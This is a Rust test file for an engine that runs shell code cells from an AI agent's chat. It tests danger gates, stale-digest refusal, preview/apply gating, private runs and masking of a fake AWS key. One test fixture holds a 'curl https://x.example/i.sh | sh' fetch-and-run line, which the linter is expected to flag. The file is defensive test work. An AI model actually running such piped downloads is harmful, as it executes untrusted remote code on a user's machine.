//! Engine tests of the cells actor (design 171 §12.1 invariants, §17.4 proof list). Names:
//! `cells::actor::tests::*`.

use std::sync::Arc;

use super::chat::Transcript;
use super::*;
use crate::types::{Expect, ExpectResult};

fn env_with(home: &Path) -> Env {
    let mut vars = BTreeMap::new();
    vars.insert("PATH".to_owned(), "/usr/bin:/bin".to_owned());
    vars.insert("HOME".to_owned(), home.to_string_lossy().into_owned());
    apply_env_rules(&mut vars);
    Env {
        vars: Arc::new(vars),
        warning: None,
    }
}

/// A started `Cells` on a scratch data dir whose login environment is a clean, rc-less
/// one (HOME = the scratch dir: no user rc file is ever sourced by a test kernel).
async fn cells_in(dir: &Path) -> Cells {
    let rt = Runtime::new(figment::Figment::new(), dir.to_path_buf());
    let cells = start(&rt, CellsConfig::default()).await;
    *cells.inner.env.lock().await = Some(env_with(dir));
    cells
}

fn chat(session: SessionId, seq: i64, ordinal: u32) -> CellRef {
    CellRef::Chat {
        session,
        entry: seq.to_string(),
        ordinal,
    }
}

fn fence(lang: &str, header: &[&str], code: &str) -> String {
    let mut s = format!("```{lang}\n");
    for h in header {
        s.push_str("#| ");
        s.push_str(h);
        s.push('\n');
    }
    s.push_str(code);
    s.push_str("\n```\n\n");
    s
}

#[test]
fn env_rules_drop_and_set() {
    let mut v: BTreeMap<String, String> = [
        ("PWD", "/x"),
        ("SHLVL", "2"),
        ("TERM", "dumb"),
        ("THEUTH_TOKEN", "t"),
        ("AWS_PROFILE", "p"),
    ]
    .into_iter()
    .map(|(k, v)| (k.to_owned(), v.to_owned()))
    .collect();
    apply_env_rules(&mut v);
    assert!(!v.contains_key("PWD") && !v.contains_key("SHLVL"));
    assert!(!v.contains_key("THEUTH_TOKEN"));
    assert_eq!(v["TERM"], "xterm-256color");
    assert_eq!(v["COLORTERM"], "truecolor");
    assert_eq!(v["THEUTH_CELL"], "1");
    assert_eq!(v["AWS_PROFILE"], "p");
}

#[test]
fn selections_are_utf8_byte_offsets() {
    assert_eq!(byte_slice("aé😀b", 1, 7), Some("é😀"));
    assert_eq!(byte_slice("abc", 0, 3), Some("abc"));
    assert_eq!(byte_slice("abc", 2, 9), None);
    // Inside `é` is not a boundary.
    assert_eq!(byte_slice("aé", 0, 2), None);
}

/// §9.3 (A1): only the runs a turn's text carries are consumed by it.
#[test]
fn turns_consume_only_the_runs_they_carry() {
    let text = "Sky's message\n<cell_result run=\"r_1\" name=\"a\" exit=\"0\">x</cell_result>\n\
                <cell_result run=\"r_2\" cell=\"1\" message=\"4\">y</cell_result> run=\"r_1\"";
    assert_eq!(runs_named(text), [RunId("r_1".into()), RunId("r_2".into())]);
    assert!(runs_named("a scoped turn with no results").is_empty());
}

/// Invariant 5 (digest guard + superseded), 7 (danger), §5.6 (missing cwd), §3.6 (invalid),
/// inv. 12 (lint never refuses a single press).
#[test]
fn press_refusals() {
    let dir = tempfile::tempdir().unwrap();
    let d = dir.path().display().to_string();
    let s = SessionId(uuid::Uuid::new_v4());
    let text = [
        fence("bash", &[&format!("cwd: {d}"), "name: preview"], "sudo ls"),
        fence(
            "bash",
            &[
                &format!("cwd: {d}"),
                "name: apply",
                "danger",
                "label: Apply",
            ],
            "echo apply",
        ),
        fence("bash", &["cwd: /definitely/not/here"], "ls"),
        fence("bash", &["name: nocwd"], "ls"),
    ]
    .concat();
    let t = Transcript {
        messages: vec![(5, text.clone())],
        edited: Vec::new(),
    };
    let home = Some(d.as_str());
    let i = Cells::inspect(&t, &chat(s, 5, 1), home).unwrap();
    let cwd = refuse(&i, &i.presented.digest, &RunMode::Cell).unwrap();
    assert_eq!(cwd, dir.path());
    assert!(
        i.chips
            .iter()
            .any(|c| c.kind == crate::types::ChipKind::Sudo)
    );
    // The text on screen differs from the engine's record → refused.
    assert_eq!(
        refuse(&i, "stale-digest", &RunMode::Cell).unwrap_err(),
        CellsError::Changed
    );
    // Danger: only the whole cell from its button.
    let i = Cells::inspect(&t, &chat(s, 5, 2), home).unwrap();
    let seen = i.presented.digest.clone();
    assert!(refuse(&i, &seen, &RunMode::Cell).is_ok());
    for mode in [
        RunMode::Line { line: 1 },
        RunMode::Selection { from: 0, to: 2 },
    ] {
        assert_eq!(
            refuse(&i, &seen, &mode).unwrap_err(),
            CellsError::Danger("Apply".into())
        );
    }
    let i = Cells::inspect(&t, &chat(s, 5, 3), home).unwrap();
    let seen = i.presented.digest.clone();
    assert!(matches!(
        refuse(&i, &seen, &RunMode::Cell),
        Err(CellsError::FolderNotFound(_))
    ));
    let i = Cells::inspect(&t, &chat(s, 5, 4), home).unwrap();
    let seen = i.presented.digest.clone();
    assert_eq!(
        refuse(&i, &seen, &RunMode::Cell).unwrap_err(),
        CellsError::Invalid("a chat cell needs `cwd`".into())
    );
    // No such message / ordinal → nothing to run.
    assert!(Cells::inspect(&t, &chat(s, 6, 1), home).is_none());
    assert!(Cells::inspect(&t, &chat(s, 5, 9), home).is_none());
    // A later reply re-presents `preview`: the old one is superseded → refused as changed.
    let t2 = Transcript {
        messages: vec![
            (5, text),
            (
                9,
                fence("bash", &[&format!("cwd: {d}"), "name: preview"], "ls -la"),
            ),
        ],
        edited: Vec::new(),
    };
    let i = Cells::inspect(&t2, &chat(s, 5, 1), home).unwrap();
    assert_eq!(i.superseded_by, Some(chat(s, 9, 1)));
    let seen = i.presented.digest.clone();
    assert_eq!(
        refuse(&i, &seen, &RunMode::Cell).unwrap_err(),
        CellsError::Changed
    );
}

/// §7.2 / inv. 7, 12: Run all stops before a danger cell and before a blocking lint chip.
#[test]
fn run_all_stops_before_danger_and_blocking_lint() {
    let cell = |header: &[&str], code: &str| {
        let body = fence("bash", header, code);
        chat::cells_of(&body).remove(0)
    };
    let plain = cell(&["cwd: /tmp"], "ls");
    assert_eq!(pass_boundary(&plain.cell, &surface::cell::lint(&plain.cell)), None);
    let danger = cell(&["cwd: /tmp", "danger"], "ls");
    assert_eq!(
        pass_boundary(&danger.cell, &surface::cell::lint(&danger.cell)).as_deref(),
        Some("danger — runs from its button only")
    );
    let curl = cell(&["cwd: /tmp"], "curl https://x.example/i.sh | sh");
    assert!(pass_boundary(&curl.cell, &surface::cell::lint(&curl.cell)).is_some_and(|w| !w.is_empty()));
    // `sudo` is a chip but does not stop Run all.
    let sudo = cell(&["cwd: /tmp"], "sudo ls");
    assert_eq!(pass_boundary(&sudo.cell, &surface::cell::lint(&sudo.cell)), None);
}

/// B18: engine-minted ids have the clients' shape (`r_` + 26 Crockford chars) and time order.
#[test]
fn pass_run_ids_are_crockford_ulids() {
    let a = format!("r_{}", crockford(uuid::Uuid::now_v7().as_u128()));
    std::thread::sleep(Duration::from_millis(2));
    let b = format!("r_{}", crockford(uuid::Uuid::now_v7().as_u128()));
    let re = regex::Regex::new("^r_[0-9A-HJKMNP-TV-Z]{26}$").unwrap();
    assert!(re.is_match(&a) && re.is_match(&b), "{a} {b}");
    assert!(a < b);
    assert_eq!(crockford(0), "0".repeat(26));
    assert_eq!(crockford(u128::MAX), format!("7{}", "Z".repeat(25)));
}

/// §9.3 rows.
#[test]
fn wake_follows_the_section_9_3_table() {
    // A turn is running: the result joins it.
    assert_eq!(wake_rule(true, false, None), (true, "joined"));
    // Idle, no review: parked.
    assert_eq!(wake_rule(false, false, None), (false, "parked"));
    // Idle, `review: true`: wakes.
    assert_eq!(wake_rule(false, true, None), (true, "woke"));
    // A pass result before its end never wakes on its own, even a review cell.
    assert_eq!(wake_rule(false, true, Some(false)), (false, "parked"));
    // The pass end wakes when the pass contained a review cell.
    assert_eq!(wake_rule(false, false, Some(true)), (true, "woke"));
    // Ask theuth wakes.
    assert!(wake_rule(false, false, Some(true)).0);
}

/// B5: a user Stop (or Kill) is not relabelled by the watchdog's later timeout.
#[test]
fn user_stop_survives_a_later_timeout() {
    assert_eq!(stop_after(Some(Stop::Stopped), Stop::Timeout), Some(Stop::Stopped));
    assert_eq!(stop_after(Some(Stop::Killed), Stop::Timeout), Some(Stop::Killed));
    assert_eq!(stop_after(Some(Stop::Stopped), Stop::Killed), Some(Stop::Killed));
    assert_eq!(stop_after(Some(Stop::Timeout), Stop::Killed), Some(Stop::Timeout));
    assert_eq!(stop_after(None, Stop::Timeout), Some(Stop::Timeout));
}

fn finished(id: &str, cell: CellRef, code_sha: &str, ended_ms: i64, state: RunState) -> CellRun {
    CellRun {
        id: RunId(id.into()),
        kernel: KernelId {
            scope: cell.scope(),
            spec: KernelSpec::Monty,
        },
        cell,
        mode: RunMode::Cell,
        pass: None,
        interpreter: "bash".into(),
        cwd: "/tmp".into(),
        env_names: Vec::new(),
        presented_sha: code_sha.into(),
        code_sha: code_sha.into(),
        edited: false,
        pressed_by: "desktop · t".into(),
        state,
        exit: Some(ExitStatus::Code(0)),
        secs: Some(1.0),
        expect: vec![ExpectResult {
            item: Expect::Text("to update".into()),
            met: true,
        }],
        summary: Some("~3 update · 0 replace · 0 delete".into()),
        output_bytes: Some(1),
        queued_ms: ended_ms - 1000,
        started_ms: Some(ended_ms - 1000),
        ended_ms: Some(ended_ms),
        masked: 0,
        private: false,
        name: None,
        input: None,
    }
}

/// Inv. 8 / §7.6: the gate arms only on the preview's current code, recent and successful;
/// an edited preview and a 61-minute-old preview disarm it.
#[tokio::test]
async fn after_gate_with_edited_and_old_previews() {
    let dir = tempfile::tempdir().unwrap();
    let cells = cells_in(dir.path()).await;
    let s = SessionId(uuid::Uuid::new_v4());
    let scope = Scope::Session(s);
    let d = dir.path().display().to_string();
    let preview = fence(
        "bash",
        &[&format!("cwd: {d}"), "name: preview"],
        "echo plan",
    );
    let apply = fence(
        "bash",
        &[&format!("cwd: {d}"), "name: apply", "after: preview"],
        "echo apply",
    );
    let t = Transcript {
        messages: vec![(3, format!("{preview}{apply}"))],
        edited: Vec::new(),
    };
    let home = Some(d.as_str());
    let preview_digest = Cells::inspect(&t, &chat(s, 3, 1), home)
        .unwrap()
        .presented
        .digest;
    let store = cells.store().unwrap().clone();
    let lineage = format!("{}/preview", scope.key());
    let check = |i: &Inspected| refuse(i, &i.presented.digest, &RunMode::Cell);

    // Never ran → disarmed.
    let mut i = Cells::inspect(&t, &chat(s, 3, 2), home).unwrap();
    cells.arm(&scope, &mut i).await.unwrap();
    assert!(matches!(check(&i), Err(CellsError::Disarmed(_))));

    // Ran 10 minutes ago on the current code → armed.
    let r = finished(
        "r_p1",
        chat(s, 3, 1),
        &preview_digest,
        now_ms() - 600_000,
        RunState::Done,
    );
    store
        .insert(&r, &scope.key(), Some(&lineage))
        .await
        .unwrap();
    store.finish(&r, None, None).await.unwrap();
    let mut i = Cells::inspect(&t, &chat(s, 3, 2), home).unwrap();
    cells.arm(&scope, &mut i).await.unwrap();
    assert!(check(&i).is_ok());
    assert!(matches!(&i.after, Some(Gate::Armed(a)) if a.by == r.id));

    // The preview was edited since (its latest run ran other code) → disarmed.
    let r2 = finished(
        "r_p2",
        chat(s, 3, 1),
        "other-code",
        now_ms() - 300_000,
        RunState::Done,
    );
    store
        .insert(&r2, &scope.key(), Some(&lineage))
        .await
        .unwrap();
    store.finish(&r2, None, None).await.unwrap();
    let mut i = Cells::inspect(&t, &chat(s, 3, 2), home).unwrap();
    cells.arm(&scope, &mut i).await.unwrap();
    assert!(matches!(check(&i), Err(CellsError::Disarmed(why)) if why.contains("edited")));

    // The current-code preview, but 61 minutes old → disarmed.
    let r3 = finished(
        "r_p3",
        chat(s, 3, 1),
        &preview_digest,
        now_ms() - 61 * 60_000,
        RunState::Done,
    );
    let r3 = CellRun {
        queued_ms: now_ms() - 61 * 60_000 - 1000,
        ..r3
    };
    let s2 = SessionId(uuid::Uuid::new_v4());
    let scope2 = Scope::Session(s2);
    store
        .insert(
            &r3,
            &scope2.key(),
            Some(&format!("{}/preview", scope2.key())),
        )
        .await
        .unwrap();
    store.finish(&r3, None, None).await.unwrap();
    let mut i = Cells::inspect(&t, &chat(s2, 3, 2), home).unwrap();
    cells.arm(&scope2, &mut i).await.unwrap();
    assert!(matches!(check(&i), Err(CellsError::Disarmed(why)) if why.contains("old")));
}

/// A kernel that only records what is typed into it.
struct Typed(KernelSpec, Mutex<Vec<Vec<u8>>>);

#[async_trait::async_trait]
impl Kernel for Typed {
    fn spec(&self) -> &KernelSpec {
        &self.0
    }
    fn phase(&self) -> KernelPhase {
        KernelPhase::Busy
    }
    async fn execute(&self, _: ExecuteRequest, _: crate::kernel::KernelSink) -> Result<()> {
        Ok(())
    }
    async fn input(&self, _: &RunId, bytes: Vec<u8>) -> Result<()> {
        self.1.lock().push(bytes);
        Ok(())
    }
    async fn interrupt(&self) -> Result<()> {
        Ok(())
    }
    async fn kill(&self) -> Result<()> {
        Ok(())
    }
    async fn shutdown(&self) -> Result<()> {
        Ok(())
    }
    fn live_cwd(&self) -> Option<String> {
        None
    }
}

/// L11: a kernel's `input()` request shows on the run until `cell_input` answers it; the
/// answer reaches the kernel as typed (python: raw text, no newline added).
#[tokio::test]
async fn input_prompt_is_shown_until_answered() {
    let dir = tempfile::tempdir().unwrap();
    let cells = cells_in(dir.path()).await;
    let s = SessionId(uuid::Uuid::new_v4());
    let mut rec = finished("r_in", chat(s, 1, 1), "d", now_ms(), RunState::Running);
    rec.ended_ms = None;
    let key = json(&rec.kernel);
    let kernel = Arc::new(Typed(KernelSpec::Monty, Mutex::new(Vec::new())));
    {
        let mut st = cells.inner.state.lock();
        st.kernels.insert(
            key.clone(),
            Slot {
                id: rec.kernel.clone(),
                label: "Monty".into(),
                kernel: Some(kernel.clone() as Arc<dyn Kernel>),
                log: None,
                tx: mpsc::unbounded_channel().0,
                prev_cell: None,
                last_used: Instant::now(),
                busy: true,
                env_warning: None,
            },
        );
        st.runs.insert(
            rec.id.clone(),
            Live {
                record: rec.clone(),
                key,
                code: String::new(),
                cwd: dir.path().to_path_buf(),
                env: Vec::new(),
                timeout: None,
                meta: Meta::default(),
                executing: true,
                stop: None,
                buf: Vec::new(),
                tx: broadcast::channel(4).0,
                done: Vec::new(),
            },
        );
    }
    let prompt = crate::types::InputPrompt {
        prompt: "password: ".into(),
        password: true,
    };
    cells.waiting_input(&rec.id, prompt.clone()).await;
    let live = cells.find_run(&rec.id).await.unwrap().unwrap();
    assert_eq!(live.input, Some(prompt));
    cells
        .input(rec.id.clone(), b"hunter2".to_vec())
        .await
        .unwrap();
    assert_eq!(cells.find_run(&rec.id).await.unwrap().unwrap().input, None);
    assert_eq!(*kernel.1.lock(), vec![b"hunter2".to_vec()]);
}

/// §9.1 / inv. 10 (A1's `cell_output`): the agent-safe page of a private run is refused
/// `Private`; the owner's own ANSI view still reads it.
#[tokio::test]
async fn output_refuses_private_runs_for_the_agent() {
    let dir = tempfile::tempdir().unwrap();
    let cells = cells_in(dir.path()).await;
    let s = SessionId(uuid::Uuid::new_v4());
    let store = cells.store().unwrap().clone();
    for (id, private) in [("r_priv", true), ("r_pub", false)] {
        let mut r = finished(id, chat(s, 1, 1), "d", now_ms(), RunState::Done);
        r.private = private;
        store
            .insert(&r, &Scope::Session(s).key(), None)
            .await
            .unwrap();
        store.finish(&r, None, None).await.unwrap();
        let d = cells.paths().run_dir(&r.id);
        std::fs::create_dir_all(&d).unwrap();
        std::fs::write(d.join("out.txt"), "key AKIAABCDEFGHIJKLMNOP").unwrap();
        std::fs::write(d.join("out.ansi"), "key AKIAABCDEFGHIJKLMNOP").unwrap();
    }
    let page = |id: &str, ansi| cells.output(RunId(id.into()), 0, 100, ansi);
    assert_eq!(
        page("r_priv", false).await.unwrap_err(),
        CellsError::Private
    );
    assert!(page("r_priv", true).await.unwrap().text.contains("AKIA"));
    assert_eq!(
        page("r_pub", false).await.unwrap().text,
        "key [masked aws-key-id]"
    );
    assert_eq!(
        page("r_missing", false).await.unwrap_err(),
        CellsError::NotFound("r_missing".into())
    );
    assert!(
        store
            .get(&RunId("r_priv".into()))
            .await
            .unwrap()
            .unwrap()
            .run
            .private
    );
}

/// §5.10: the same client-minted id twice is one run; a reused id elsewhere is refused.
#[tokio::test]
async fn idempotent_run_ids() {
    let dir = tempfile::tempdir().unwrap();
    let cells = cells_in(dir.path()).await;
    let s = SessionId(uuid::Uuid::new_v4());
    let r = finished(
        "r_same",
        chat(s, 1, 1),
        "digest-1",
        now_ms(),
        RunState::Done,
    );
    cells
        .store()
        .unwrap()
        .insert(&r, &Scope::Session(s).key(), None)
        .await
        .unwrap();
    let req = |cell: CellRef, seen: &str| RunRequest {
        cell,
        seen: seen.into(),
        mode: RunMode::Cell,
        run: RunId("r_same".into()),
        edited: None,
        member_ack: None,
        pressed_by: "desktop · t".into(),
    };
    let again = cells.run(req(chat(s, 1, 1), "digest-1")).await.unwrap();
    assert_eq!(again.id, r.id);
    let n: (i64,) = sqlx::query_as("SELECT COUNT(*) FROM cell_runs")
        .fetch_one(&cells.store().unwrap().pool)
        .await
        .unwrap();
    assert_eq!(n.0, 1);
    assert_eq!(
        cells.run(req(chat(s, 1, 2), "digest-1")).await.unwrap_err(),
        CellsError::RunIdConflict("r_same".into())
    );
    assert_eq!(
        cells.run(req(chat(s, 1, 1), "digest-2")).await.unwrap_err(),
        CellsError::RunIdConflict("r_same".into())
    );
}

/// §5.3 / inv. 11: an engine restart settles `running` → `lost` with what the log holds
/// and `queued` → `cancelled`; nothing is re-run.
#[tokio::test]
async fn restart_settles_lost_without_replay() {
    let dir = tempfile::tempdir().unwrap();
    let cells = cells_in(dir.path()).await;
    let s = SessionId(uuid::Uuid::new_v4());
    let log = dir.path().join("j1.log");
    std::fs::write(&log, b"before\x1b]133;C\x07step 1 done\r\nstep 2 runn").unwrap();
    let store = cells.store().unwrap().clone();
    let mut running = finished("r_run", chat(s, 1, 1), "d", now_ms(), RunState::Running);
    running.ended_ms = None;
    store
        .insert(&running, &Scope::Session(s).key(), None)
        .await
        .unwrap();
    store
        .started(&running.id, now_ms() - 5000, log.to_str(), Some(6))
        .await
        .unwrap();
    let mut queued = finished("r_q", chat(s, 1, 2), "d", now_ms(), RunState::Queued);
    queued.ended_ms = None;
    store
        .insert(&queued, &Scope::Session(s).key(), None)
        .await
        .unwrap();
    cells.settle().await;
    let lost = store.get(&running.id).await.unwrap().unwrap();
    assert_eq!(lost.run.state, RunState::Lost);
    assert!(lost.run.ended_ms.is_some());
    let text = std::fs::read_to_string(cells.paths().run_dir(&running.id).join("out.txt")).unwrap();
    assert!(
        text.contains("step 1 done") && text.contains("step 2 runn"),
        "{text:?}"
    );
    assert!(!text.contains("before"));
    assert_eq!(
        store.get(&queued.id).await.unwrap().unwrap().run.state,
        RunState::Cancelled
    );
    let n: (i64,) = sqlx::query_as("SELECT COUNT(*) FROM cell_runs")
        .fetch_one(&store.pool)
        .await
        .unwrap();
    assert_eq!(n.0, 2, "no run was created by the restart");
    assert!(cells.live().await.unwrap().is_empty());
}

// ---- end to end with real shells ----

#[derive(kameo::Actor)]
struct Announced {
    store: Store,
    seen: Arc<Mutex<Vec<(RunId, bool)>>>,
}

impl Message<CellEvent> for Announced {
    type Reply = ();
    async fn handle(&mut self, e: CellEvent, _: &mut Context<Self, Self::Reply>) {
        if let CellEvent::RunFinished { run, .. } = e {
            let final_row = self
                .store
                .get(&run)
                .await
                .ok()
                .flatten()
                .is_some_and(|r| r.run.ended_ms.is_some() && r.run.state != RunState::Running);
            self.seen.lock().push((run, final_row));
        }
    }
}

struct Bench {
    cells: Cells,
    session: SessionId,
    text: String,
    dir: PathBuf,
}

impl Bench {
    async fn press(&self, ordinal: u32, mode: RunMode, id: &str) -> Result<CellRun> {
        let t = Transcript {
            messages: vec![(1, self.text.clone())],
            edited: Vec::new(),
        };
        let cell = chat(self.session, 1, ordinal);
        let env = self.cells.login_env().await;
        let home = env.vars.get("HOME").cloned();
        let i = Cells::inspect(&t, &cell, home.as_deref()).expect("cell");
        let seen = i.presented.digest.clone();
        let p = self
            .cells
            .prepare_from(i, &cell.scope(), &seen, &mode, None, &env)
            .await?;
        self.cells
            .enqueue(
                RunId(id.into()),
                cell,
                mode,
                None,
                None,
                seen,
                "desktop · test".into(),
                p,
            )
            .await
    }

    async fn until(&self, id: &str, what: impl Fn(&CellRun) -> bool) -> CellRun {
        let deadline = Instant::now() + Duration::from_secs(30);
        loop {
            if let Ok(Some(r)) = self.cells.find_run(&RunId(id.into())).await
                && what(&r)
            {
                return r;
            }
            assert!(Instant::now() < deadline, "{id} never got there");
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
    }

    async fn done(&self, id: &str) -> CellRun {
        self.until(id, |r| r.ended_ms.is_some() && !self.cells.is_live(&r.id))
            .await
    }

    fn out(&self, id: &str) -> String {
        std::fs::read_to_string(
            self.cells
                .paths()
                .run_dir(&RunId(id.into()))
                .join("out.txt"),
        )
        .unwrap_or_default()
    }

    async fn run(&self, ordinal: u32, mode: RunMode, id: &str) -> (CellRun, String) {
        self.press(ordinal, mode, id).await.expect("press");
        let r = self.done(id).await;
        (r, self.out(id))
    }
}

/// The §17.4 shell e2e (item 3): real `/bin/bash` and `zsh` kernels in a temp cwd — the CWD
/// rule of §5.6, PIPESTATUS + a trailing comment, an unclosed `if`, exact exit codes, a
/// `read -p` answered through `input`; plus queue order, cancel of a queued run, Stop under
/// a `yes` flood, credential masks and private runs, the run file deleted at D, and every
/// `RunFinished` announced only after its row is final (inv. 13).
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn e2e_real_shells() {
    if !Path::new("/bin/bash").is_file() {
        return;
    }
    let _one = note::DOCS_TEST.lock().await;
    let tmp = tempfile::tempdir().unwrap();
    let dir = tmp.path().canonicalize().unwrap();
    std::fs::create_dir_all(dir.join("sub")).unwrap();
    std::fs::write(dir.join("top.txt"), "").unwrap();
    std::fs::write(dir.join("sub").join("inner.txt"), "").unwrap();
    let rt = Runtime::new(figment::Figment::new(), dir.join("data"));
    let jobs = tools::Jobs::spawn_with_mailbox(
        tools::Jobs::new(rt.clone(), Duration::from_secs(1), Duration::from_secs(600)),
        runtime::subscriber_mailbox(),
    );
    let _ = jobs.register(tools::JOBS_ACTOR);
    let cells = start(&rt, CellsConfig::default()).await;
    *cells.inner.env.lock().await = Some(env_with(&dir));
    let seen = Arc::new(Mutex::new(Vec::new()));
    let rec = Announced::spawn_with_mailbox(
        Announced {
            store: cells.store().unwrap().clone(),
            seen: Arc::clone(&seen),
        },
        runtime::subscriber_mailbox(),
    );
    rt.subscribe::<Announced, CellEvent>(&rec).await;
    let d = dir.display().to_string();
    let cwd = format!("cwd: {d}");
    let text = [
        fence("bash", &[&cwd, "name: a"], "cd sub\nls"), // 1
        fence(
            "bash",
            &[&cwd],
            "true | false; echo \"ps=${PIPESTATUS[1]}\" # trailing comment",
        ), // 2
        fence("bash", &[&cwd], "if true; then\n  echo never"), // 3
        fence("bash", &[&cwd], "sh -c 'exit 42'"),       // 4
        fence("bash", &[&cwd], "read -p 'name? ' n; echo \"hello $n\""), // 5
        fence("bash", &[&cwd], "sleep 0.5; echo one"),   // 6
        fence("bash", &[&cwd], "echo two"),              // 7
        fence("bash", &[&cwd], "sleep 5"),               // 8
        fence("bash", &[&cwd], "echo nine"),             // 9
        fence("bash", &[&cwd], "yes"),                   // 10
        fence(
            "bash",
            &[&cwd, "env: P=a b"],
            "echo AKIAABCDEFGHIJKLMNOP; echo \"P=$P\"",
        ), // 11
        fence("bash", &[&cwd, "private"], "echo hidden"), // 12
        fence("zsh", &[&cwd], "echo zsh-ok # comment\nfalse"), // 13
        fence(
            "bash",
            &[&cwd],
            "export E1_MARK=old; trap '' INT; sleep 120; trap - INT; echo after-kill",
        ), // 14
        fence("bash", &[&cwd], "echo \"mark=${E1_MARK:-fresh}\""), // 15
    ]
    .concat();
    let b = Bench {
        cells: cells.clone(),
        session: SessionId(uuid::Uuid::new_v4()),
        text,
        dir: dir.clone(),
    };

    // §5.6 table: Run A (cd sub; ls) → lists sub.
    let (r, out) = b.run(1, RunMode::Cell, "r_a").await;
    assert_eq!(r.exit, Some(ExitStatus::Code(0)), "{out}");
    assert!(out.contains("inner.txt"), "{out:?}");
    assert_eq!(r.state, RunState::Done);
    assert_eq!(r.name.as_deref(), Some("a"));
    assert!(!r.private);
    // then line 2 of A: no prologue, the cd holds.
    let (_, out) = b.run(1, RunMode::Line { line: 2 }, "r_a_l2").await;
    assert!(
        out.contains("inner.txt") && !out.contains("top.txt"),
        "{out:?}"
    );
    // Run B (PIPESTATUS + trailing comment, the zsh trap) runs clean.
    let (r, out) = b.run(2, RunMode::Cell, "r_b").await;
    assert_eq!(r.exit, Some(ExitStatus::Code(0)), "{out}");
    assert!(out.contains("ps=1"), "{out:?}");
    // then line 2 of A: previous run was B → prologue → lists the cwd.
    let (_, out) = b.run(1, RunMode::Line { line: 2 }, "r_a_l2b").await;
    assert!(out.contains("top.txt") && out.contains("sub"), "{out:?}");
    // An unclosed `if` fails at once instead of hanging.
    let t0 = Instant::now();
    let (r, out) = b.run(3, RunMode::Cell, "r_if").await;
    assert!(t0.elapsed() < Duration::from_secs(10));
    assert_eq!(r.state, RunState::Failed, "{out}");
    assert!(!out.contains("never"));
    // Exit codes are exact.
    let (r, _) = b.run(4, RunMode::Cell, "r_42").await;
    assert_eq!(r.exit, Some(ExitStatus::Code(42)));
    assert_eq!(r.state, RunState::Failed);
    // A `read -p` prompt answered through `input`.
    b.press(5, RunMode::Cell, "r_read").await.unwrap();
    b.until("r_read", |r| r.state == RunState::Running).await;
    tokio::time::sleep(Duration::from_millis(300)).await;
    cells
        .input(RunId("r_read".into()), b"theuth\r".to_vec())
        .await
        .unwrap();
    let r = b.done("r_read").await;
    assert!(
        b.out("r_read").contains("hello theuth"),
        "{:?}",
        b.out("r_read")
    );
    assert_eq!(r.state, RunState::Done);

    // FIFO per kernel: 7 starts after 6 ended.
    b.press(6, RunMode::Cell, "r_6").await.unwrap();
    b.press(7, RunMode::Cell, "r_7").await.unwrap();
    let r6 = b.done("r_6").await;
    let r7 = b.done("r_7").await;
    assert!(r6.ended_ms.unwrap() <= r7.started_ms.unwrap());
    assert!(b.out("r_7").contains("two"));
    // A second press on a queued/running cell attaches to the same run.
    b.press(8, RunMode::Cell, "r_8").await.unwrap();
    let twice = cells
        .live_of_cell(&json(&chat(b.session, 1, 8)))
        .map(|r| r.id);
    assert_eq!(twice, Some(RunId("r_8".into())));
    // Stop on a queued run cancels it; it never runs.
    b.press(9, RunMode::Cell, "r_9").await.unwrap();
    cells.stop(RunId("r_9".into()), false).await.unwrap();
    let r9 = b.done("r_9").await;
    assert_eq!(r9.state, RunState::Cancelled);
    assert!(r9.started_ms.is_none());
    b.until("r_8", |r| r.state == RunState::Running).await;
    cells.stop(RunId("r_8".into()), false).await.unwrap();
    assert_eq!(b.done("r_8").await.state, RunState::Stopped);

    // Stop under a `yes` flood: the Stop reaches the kernel in < 500 ms.
    b.press(10, RunMode::Cell, "r_yes").await.unwrap();
    b.until("r_yes", |r| r.state == RunState::Running).await;
    tokio::time::sleep(Duration::from_millis(500)).await;
    let t0 = Instant::now();
    cells.stop(RunId("r_yes".into()), false).await.unwrap();
    let stop_took = t0.elapsed();
    assert!(
        stop_took < Duration::from_millis(500),
        "stop took {stop_took:?}"
    );
    let r = b.done("r_yes").await;
    assert_eq!(r.state, RunState::Stopped);

    // Credentials: the user's view keeps them, the agent copy masks them; env names only.
    let (r, out) = b.run(11, RunMode::Cell, "r_cred").await;
    assert!(
        out.contains("AKIAABCDEFGHIJKLMNOP") && out.contains("P=a b"),
        "{out:?}"
    );
    assert_eq!(r.env_names, vec!["P".to_owned()]);
    // L11: the agent's copy masked one value; the run carries it.
    assert_eq!(r.masked, 1);
    let page = cells
        .output(RunId("r_cred".into()), 0, 8000, false)
        .await
        .unwrap();
    assert!(page.text.contains("[masked aws-key-id]") && !page.text.contains("AKIA"));
    // The run file is gone after the run; `code` holds the code that ran.
    let kdir = cells.paths().root.join("kernels");
    let leftovers: Vec<_> = walk(&kdir)
        .into_iter()
        .filter(|p| p.file_name().is_some_and(|n| n == "run.sh"))
        .collect();
    assert!(leftovers.is_empty(), "{leftovers:?}");
    assert_eq!(
        std::fs::read_to_string(cells.paths().run_dir(&r.id).join("code")).unwrap(),
        "echo AKIAABCDEFGHIJKLMNOP; echo \"P=$P\""
    );
    // Private: nothing leaves the store for the agent.
    let (r, _) = b.run(12, RunMode::Cell, "r_priv").await;
    assert!(r.private && r.name.is_none());
    assert_eq!(
        cells
            .output(RunId("r_priv".into()), 0, 100, false)
            .await
            .unwrap_err(),
        CellsError::Private
    );

    // zsh: a trailing comment and an exact exit status.
    if Path::new("/bin/zsh").is_file() {
        let (r, out) = b.run(13, RunMode::Cell, "r_zsh").await;
        assert!(out.contains("zsh-ok"), "{out:?}");
        assert_eq!(r.exit, Some(ExitStatus::Code(1)));
    }

    // B16: Kill ends a run whose shell ignores Stop; the kernel closes, the next run is fresh.
    b.press(14, RunMode::Cell, "r_trap").await.unwrap();
    b.until("r_trap", |r| r.state == RunState::Running).await;
    tokio::time::sleep(Duration::from_millis(300)).await;
    cells.stop(RunId("r_trap".into()), false).await.unwrap();
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert!(cells.is_live(&RunId("r_trap".into())), "Stop is ignored");
    cells.stop(RunId("r_trap".into()), true).await.unwrap();
    let r = b.done("r_trap").await;
    assert_eq!(r.state, RunState::Killed);
    assert!(!b.out("r_trap").contains("after-kill"), "{:?}", b.out("r_trap"));
    assert!(
        cells
            .kernels_of(&Scope::Session(b.session))
            .iter()
            .any(|k| matches!(k.id.spec, KernelSpec::Shell { .. })
                && matches!(k.phase, KernelPhase::Dead | KernelPhase::Closed)),
        "the killed kernel is gone"
    );
    let (_, out) = b.run(15, RunMode::Cell, "r_fresh").await;
    assert!(out.contains("mark=fresh"), "{out:?}");

    // B11: a Run all pass reports where and why it stopped (note scope: the docs are a fake).
